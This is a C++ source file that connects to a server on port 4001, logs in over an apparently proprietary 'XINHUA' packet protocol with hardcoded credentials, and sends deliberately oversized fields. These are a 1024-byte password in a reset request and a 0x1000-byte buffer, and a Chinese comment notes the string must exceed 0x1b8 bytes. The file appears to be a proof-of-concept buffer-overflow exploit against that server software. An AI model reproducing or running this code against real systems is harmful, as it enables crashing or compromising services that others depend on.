
#include <string>

#include "cmd.h"
#include "network.h"

using namespace std;

Cmd::Cmd(string serverip, int target) {
	m_network = new Network(serverip, 4001);
	m_network->connectServer();
	m_target = target;
}

Cmd::~Cmd() {
	if (m_network) {
		delete m_network;
	}
}


int Cmd::writePacket(unsigned short cmd, unsigned short type, char* data, int datasize) {
	if (datasize >= 0x100000)
	{
		return 0;
	}

	char* pack = new char[datasize + 16 + 16];
	LPXINHUA_PACK_HDR hdr = (LPXINHUA_PACK_HDR)pack;

	hdr->type = type;
	hdr->retcode = 0;
	hdr->cmd = cmd;

	memcpy(hdr->flag, "A5A5A5", 6);

	hdr->datasize = datasize + 6;

	memcpy(pack + sizeof(XINHUA_PACK_HDR), data, datasize);

	int len = m_network->writeData(pack, datasize + 16);

	int c = (int)GetTickCount();
	if (c - m_tickCnt <= 20)
	{
		Sleep(20);
	}
	m_tickCnt = c;

	delete pack;
	return len;
}




int Cmd::readPacket(char* data, int bufsize) {
	int size = m_network->readData(data, bufsize);
	if (size > 0 && size < bufsize)
	{
		*(data + size) = 0;
	}

	int c = (int)GetTickCount();
	if (c - m_tickCnt <= 20)
	{
		Sleep(20);
	}
	m_tickCnt = c;

	return size;
}




void Cmd::mainwork(Cmd* cmd) {

	// 	char * oldpasswd = "123456";
	// 	char * newpasswd = "12345678";

	const char* curpasspw = "lcj";
	const char* username = "slcj";
	//  	char * curpasspw = "super";
	//  	char * username = "pass";

	char recvbuf[PACKET_BUF_SIZE];
	int size = cmd->readPacket(recvbuf, PACKET_BUF_SIZE);
	if (size <= 0 || lstrcmpiA(recvbuf, "1234567890"))
	{

	}

	size = cmd->writePacket(9, 0x3001, (char*)"", 0);

	size = cmd->readPacket(recvbuf, PACKET_BUF_SIZE);

	XINHUA_LOGIN_DATA login = { 0 };
	lstrcpyA((char*)login.username, username);
	lstrcpyA((char*)login.password, curpasspw);
	size = cmd->writePacket(0, 0x3001, (char*)&login, sizeof(XINHUA_LOGIN_DATA));

	size = cmd->readPacket(recvbuf, PACKET_BUF_SIZE);

	switch (cmd->m_target)
	{
	case 1:
	{
		char data[PACKET_BUF_SIZE] = { 0 };
		XINHUA_RESET_PW_DATA* resetpsswd = (XINHUA_RESET_PW_DATA*)data;
		lstrcpyA((char*)resetpsswd->oldpw, curpasspw);
		char* mypasswd = (char*)&resetpsswd->newpw;
		for (int i = 0; i < 1024; i++)
		{
			mypasswd[i] = 0x61;
		}
		size = cmd->writePacket(2, 0x3001, data, sizeof(XINHUA_RESET_PW_DATA) + 1024 - 16);
		size = cmd->readPacket(recvbuf, PACKET_BUF_SIZE);
		break;
	}
	break;
	case 2:
	{
		char* data = new char[0x1000];
		//data偏移32的位置是字符串就行，长度必须超过0x1b8
		memset(data, 0x61, 0x1000);
		*(WORD*)(data + 6) = 0;
		data[0x0fff] = 0;
		size = cmd->writePacket(0x1f, 0x3001, data, 2048);

		size = cmd->readPacket(recvbuf, PACKET_BUF_SIZE);

		delete[]data;
	}
	break;
	default:
		break;
	}



	int count = 0;
	while (1)
	{
		Sleep(1000);
		count++;
		if (count >= 3)
		{
			break;
		}

		size = cmd->writePacket(9, 0x3001, (char*)"", 0);

		size = cmd->readPacket(recvbuf, PACKET_BUF_SIZE);
	}

	if (cmd)
	{
		delete cmd;
	}
}